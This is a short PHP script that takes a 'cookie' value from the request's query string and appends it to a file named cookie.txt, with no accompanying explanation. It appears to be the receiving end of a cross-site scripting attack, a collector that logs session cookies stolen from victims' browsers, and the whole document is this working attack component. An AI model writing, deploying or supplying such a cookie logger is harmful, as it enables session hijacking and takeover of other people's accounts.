<?php
$cookie=$_GET['cookie'];
$log=fopen("cookie.txt","a");
fwrite($log,$cookie);
fclose($log);
?>
